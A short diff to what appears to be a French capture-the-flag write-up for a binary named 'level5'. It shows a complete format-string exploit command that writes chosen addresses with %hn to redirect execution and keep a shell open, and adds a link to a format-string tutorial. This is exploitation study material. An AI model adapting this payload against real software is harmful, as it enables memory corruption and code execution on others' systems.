@@ -34,3 +34,8 @@ Commande a lancer :
 > (python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"' ; cat -) | ./level5
 
 
+# Sources : 
+
+About the Code Execution Redirect exploit :
+
+- https://axcheron.github.io/exploit-101-format-strings/#code-execution-redirect
